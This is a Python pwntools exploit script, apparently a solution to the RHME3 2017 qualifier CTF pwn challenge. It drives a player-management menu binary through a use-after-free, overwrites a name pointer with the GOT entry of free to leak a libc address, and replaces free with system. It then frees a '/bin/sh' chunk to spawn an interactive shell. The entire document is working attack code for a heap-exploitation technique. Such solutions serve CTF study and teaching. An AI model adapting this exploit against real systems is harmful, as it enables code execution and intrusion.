#
# RHME3 Qual 2017 pwn
#
# Based on 
# * https://github.com/ResultsMayVary/ctf/RHME3
#

from pwn import *
import re

b = ELF('./main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = b.arch
context.log_level = 'info'

r = process('./main')

def add(name, marker):
    r.send('1\n')
    r.recvuntil('Enter player name:')
    r.send(name + '\n')
    r.recvuntil('Enter attack points:')
    r.send(str(marker))
    r.recvuntil('Enter defense points:')
    r.send(str(marker))
    r.recvuntil('Enter speed:')
    r.send(str(marker))
    r.recvuntil('Enter precision:')
    r.send(str(marker))
    r.recvuntil('Your choice:')

def remove(idx):
    r.send('2\n')
    r.recvuntil('Enter index:')
    r.send(str(idx) + '\n')
    r.recvuntil('Your choice:')

def select(idx):
    r.send('3\n')
    r.recvuntil('Enter index:')
    r.send(str(idx) + '\n')
    r.recvuntil('Your choice:')

def show_player():
    r.send('5\n')
    return r.recvuntil('Your choice:')
    
def edit(name):
    r.send('4\n')
    r.recvuntil('Your choice:')
    r.send('1\n')
    r.recvuntil('Enter new name:')
    r.send(name + '\n')
    r.recvuntil('Your choice:')
    r.send('0\n')
    r.recvuntil('Your choice:')

def hex_dump(s):
    return ":".join("{:02x}".format(ord(c)) for c in s)

if __name__ == "__main__":
    r.recvuntil('Your choice:')

    add('A'*200, 0xc8)
    add('B'*200, 0xc9)
    add('C'*200, 0xd0)
    add('D'*200, 0xd1)
    raw_input('after adding ABCD...')

    select(0)

    remove(0)
    remove(1)
    remove(2)
    remove(3)
    raw_input('after removing ABCD...')

    #
    # typedef _player_st { DWORD attack, defense, speed, precision; char * name } player_st;
    # malloc(sizeof(player_st)) -> 24 bytes -> LIFO fastbin
    # malloc(name) -> 16+3 bytes -> unsorted bin
    #
    add('E'*16 + p64(b.got['free']), 0xfe)
    raw_input('after adding E...')

    resp = show_player()
    l = re.findall(r"Name: (.+)", resp)[0]
    print hex_dump(l)
    l += '\x00\x00'
    l = u64(l)
    log.info("free offset: 0x%016x" % l)
    libc_addr = l - libc.symbols['free']
    log.info("libc offset: 0x%016x" % libc_addr)
    system_addr = libc_addr + libc.symbols['system']
    log.info("system offset: 0x%016x" % system_addr)
    
    raw_input('before edit name...')

    edit(p64(system_addr))

    raw_input('after editing...')

    add('/bin/sh\x00', 0xff)

    raw_input('after adding /bin/sh...')
    r.send('2\n1\n')

    r.interactive()
